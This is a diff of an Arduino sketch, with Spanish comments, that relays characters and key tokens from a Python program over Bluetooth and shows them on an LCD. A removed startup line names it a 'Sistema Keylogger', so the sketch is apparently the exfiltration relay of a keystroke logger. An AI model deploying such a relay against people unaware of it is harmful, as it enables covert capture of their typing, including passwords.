@@ -48,11 +48,7 @@ SoftwareSerial BT(7, 8);
 int col = 0;  // Columna actual (0-15)
 int row = 0;  // Fila actual (0-1)
 
-// Buffer para construcción de tokens
-String tokenBuffer = "";
-bool leyendoToken = false;
-
-// Estadísticas
+// Estadísticas (mejora sobre el original)
 unsigned long caracteresRecibidos = 0;
 unsigned long caracteresEnviados = 0;
 unsigned long tiempoInicio = 0;
@@ -78,21 +74,19 @@ void setup() {
   lcd.setCursor(0, 1);
   lcd.print("Iniciando...");
   
-  delay(1500);
+  delay(2000);
   lcd.clear();
   lcd.setCursor(0, 0);
-  lcd.print("Esperando datos");
+  lcd.print("Listo!");
+  delay(500);
+  lcd.clear();
   
   // Guardar tiempo de inicio
   tiempoInicio = millis();
   
-  // Enviar mensaje de inicio por Bluetooth
-  BT.println("=== Sistema Keylogger Iniciado ===");
-  BT.print("Tiempo: ");
-  BT.print(millis());
-  BT.println(" ms");
-  BT.println("Esperando datos del keylogger...");
-  BT.flush();
+  // Enviar mensaje de inicio por Bluetooth - SIMPLE Y DIRECTO
+  BT.print("SISTEMA LISTO\n");
+  delay(100);
 }
 
 // ============================================
@@ -100,13 +94,13 @@ void setup() {
 // ============================================
 
 void loop() {
-  // Procesar datos desde Python (USB Serial)
-  while (Serial.available() > 0) {
+  // Datos desde Python
+  if (Serial.available()) {
     char c = Serial.read();
     caracteresRecibidos++;
-    
-    // Procesar el caracter
-    procesarCaracter(c);
+
+    // Enviar por Bluetooth Y mostrar en LCD
+    procesarYEnviar(c);
   }
   
   // Comandos desde Bluetooth (opcional - para control remoto)
@@ -118,178 +112,108 @@ void loop() {
 }
 
 // ============================================
-// PROCESAMIENTO DE CARACTERES
+// PROCESAMIENTO Y ENVÍO DE DATOS
 // ============================================
 
-void procesarCaracter(char c) {
-  // Detectar inicio de token especial
+void procesarYEnviar(char c) {
+  // Ignorar saltos de línea
+  if (c == '\n' || c == '\r')
+    return;
+
+  // Caracter especial: inicio de token <XX>
   if (c == '<') {
-    leyendoToken = true;
-    tokenBuffer = "<";
-    return;
-  }
-  
-  // Si estamos leyendo un token
-  if (leyendoToken) {
-    tokenBuffer += c;
+    String token = "<";
     
-    // Fin del token
-    if (c == '>') {
-      leyendoToken = false;
-      procesarToken(tokenBuffer);
-      tokenBuffer = "";
-      return;
-    }
+    // ENVIAR el caracter '<' inmediatamente
+    BT.write('<');
+    caracteresEnviados++;
     
-    // Límite de seguridad para tokens inválidos
-    if (tokenBuffer.length() > 10) {
-      leyendoToken = false;
-      tokenBuffer = "";
+    // Leer el resto del token desde Serial
+    unsigned long timeout = millis() + 50; // timeout de 50ms
+    while (millis() < timeout) {
+      if (Serial.available()) {
+        char t = Serial.read();
+        token += t;
+        
+        // Enviar inmediatamente por Bluetooth
+        BT.write(t);
+        caracteresEnviados++;
+        
+        if (t == '>') break;
+      }
     }
-    return;
-  }
-  
-  // Caracter normal - procesar y enviar
-  procesarCaracterNormal(c);
-}
 
-// ============================================
-// PROCESAMIENTO DE TOKENS ESPECIALES
-// ============================================
+    // Procesar token para el LCD
+    procesarTokenLCD(token);
+    return;
+  }
 
-void procesarToken(String token) {
-  // Enviar token por Bluetooth (la página web lo procesará)
-  BT.print(token);
-  BT.flush();
-  caracteresEnviados += token.length();
-  
-  // ENTER - Nueva línea
-  if (token == "<EN>") {
-    row++;
-    if (row > 1) {
-      row = 0;
-      lcd.clear();
-    }
-    col = 0;
-    lcd.setCursor(col, row);
-    return;
-  }
-  
-  // BACKSPACE - Borrar caracter anterior
-  if (token == "<BK>") {
-    if (col > 0) {
-      col--;
-      lcd.setCursor(col, row);
-      lcd.print(" ");
-      lcd.setCursor(col, row);
-    } else if (row > 0) {
-      // Si estamos al inicio de la fila, ir al final de la anterior
-      row--;
-      col = 15;
-      lcd.setCursor(col, row);
-    }
-    return;
-  }
-  
-  // FLECHAS - Mostrar indicador en LCD
-  if (token == "<LEFT>") {
-    mostrarIndicador("←");
-    return;
-  }
-  
-  if (token == "<RIGHT>") {
-    mostrarIndicador("→");
-    return;
-  }
-  
-  if (token == "<UP>") {
-    mostrarIndicador("↑");
-    return;
-  }
-  
-  if (token == "<DOWN>") {
-    mostrarIndicador("↓");
-    return;
-  }
-  
-  // Token desconocido - ignorar en LCD pero enviar por BT
-  // (útil para futuros tokens especiales)
-}
-
-// ============================================
-// PROCESAMIENTO DE CARACTERES NORMALES
-// ============================================
-
-void procesarCaracterNormal(char c) {
-  // Ignorar saltos de línea y retornos de carro puros
-  // (usamos <EN> para esto)
-  if (c == '\n' || c == '\r') {
-    return;
-  }
-  
-  // Enviar por Bluetooth
+  // Caracter normal: enviar por Bluetooth Y mostrar en LCD
   BT.write(c);
-  BT.flush();
   caracteresEnviados++;
   
   // Mostrar en LCD
-  mostrarEnLCD(c);
-}
-
-// ============================================
-// VISUALIZACIÓN EN LCD
-// ============================================
-
-void mostrarEnLCD(char c) {
-  // Verificar si es un caracter imprimible
-  if (c < 32 || c > 126) {
-    return;  // Ignorar caracteres no imprimibles
-  }
-  
-  // Mostrar en la posición actual
   lcd.setCursor(col, row);
   lcd.print(c);
-  
-  // Avanzar columna
+
   col++;
-  
-  // Control de desbordamiento de línea
   if (col >= 16) {
     col = 0;
     row++;
-    
-    // Si pasamos de la segunda fila, limpiar y volver al inicio
     if (row > 1) {
       row = 0;
       lcd.clear();
     }
-    
-    lcd.setCursor(col, row);
   }
 }
 
 // ============================================
-// MOSTRAR INDICADORES TEMPORALES
+// PROCESAMIENTO DE TOKENS PARA LCD
 // ============================================
 
-void mostrarIndicador(String indicador) {
-  // Guardar posición actual
-  int colTemp = col;
-  int rowTemp = row;
+void procesarTokenLCD(String token) {
+  // ENTER
+  if (token == "<EN>") {
+    row = (row + 1) % 2;
+    col = 0;
+    lcd.setCursor(col, row);
+    return;
+  }
+
+  // BACKSPACE
+  if (token == "<BK>") {
+    if (col > 0) {
+      col--;
+    } else {
+      lcd.setCursor(0, row);
+      lcd.print("                ");
+      col = 0;
+    }
+    lcd.setCursor(col, row);
+    lcd.print(" ");
+    lcd.setCursor(col, row);
+    return;
+  }
+
+  // FLECHAS - Mostrar indicador temporal
+  if (token == "<LEFT>" || token == "<RIGHT>" || token == "<UP>" || token == "<DOWN>") {
+    int tempCol = col;
+    int tempRow = row;
+    
+    lcd.setCursor(15, 0);
+    if (token == "<LEFT>") lcd.print("<");
+    else if (token == "<RIGHT>") lcd.print(">");
+    else if (token == "<UP>") lcd.print("^");
+    else if (token == "<DOWN>") lcd.print("v");
+    
+    delay(150);
+    lcd.setCursor(15, 0);
+    lcd.print(" ");
+    lcd.setCursor(tempCol, tempRow);
+    return;
+  }
   
-  // Mostrar indicador en esquina superior derecha
-  lcd.setCursor(15, 0);
-  lcd.print(indicador);
-  
-  // Breve pausa para que sea visible
-  delay(200);
-  
-  // Limpiar indicador
-  lcd.setCursor(15, 0);
-  lcd.print(" ");
-  
-  // Restaurar cursor
-  lcd.setCursor(colTemp, rowTemp);
+  // Otros tokens se ignoran en LCD
 }
 
 // ============================================
